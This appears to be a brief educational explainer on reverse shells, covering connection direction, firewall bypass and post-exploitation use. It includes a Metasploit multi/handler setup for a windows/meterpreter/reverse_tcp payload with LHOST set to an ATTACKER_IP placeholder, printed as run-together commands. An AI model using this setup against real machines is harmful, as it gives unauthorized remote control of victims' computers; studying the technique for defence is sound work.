Reverse Shell

A reverse shell is a shell session initiated from the target machine back to the attacker's machine. It is a common method for attackers to gain remote control and bypass network firewalls.

Direction of Connection

Target initiates connection to attacker (outbound).

Primary Advantage

Bypasses strict inbound firewall rules, as outbound connections are often permitted.

Example: Meterpreter Payload

windows/meterpreter/reverse_tcp

# Attacker's machine (listening)msfconsoleuse exploit/multi/handlerset PAYLOAD windows/meterpreter/reverse_tcpset LHOST <ATTACKER_IP>set LPORT 4444run# Victim's machine (after payload execution)meterpreter > sysinfo

Once the `meterpreter` payload executes on a Windows client, it connects back to the attacker's specified IP and port, providing an interactive shell.

Key Takeaway

Reverse shells are crucial for maintaining access post-exploitation, leveraging outbound network allowances to bypass firewalls.
